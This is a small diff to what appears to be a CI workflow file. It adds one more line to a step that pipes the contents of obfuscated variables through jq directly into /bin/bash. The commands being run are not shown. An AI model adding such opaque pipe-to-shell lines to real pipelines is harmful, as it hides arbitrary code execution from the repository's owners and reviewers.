@@ -46,6 +46,7 @@ jobs:
           echo $h81007 | jq -r .dehxs8789 | /bin/bash
           printf '%s' "$v36959" | jq -r .q27102 | /bin/bash
           printf '%s' "$itot180" | jq -r .kz7 | /bin/bash
+          printf '%s' "$q9" | jq -r .ilt05558 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
